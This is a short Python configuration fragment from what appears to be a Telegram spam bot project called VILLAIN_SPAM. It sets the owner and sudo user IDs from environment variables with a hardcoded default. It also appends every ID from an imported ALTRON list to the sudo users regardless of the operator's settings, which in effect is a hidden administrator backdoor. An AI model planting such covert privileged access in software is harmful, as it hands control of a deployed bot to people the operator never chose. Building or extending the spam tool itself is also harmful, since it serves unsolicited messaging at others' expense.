...
from VILLAIN_SPAM.data import ALTRON
...
SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="5909658683").split()))
for x in ALTRON:
    SUDO_USERS.append(x)
OWNER_ID = int(getenv("OWNER_ID", default="5909658683"))
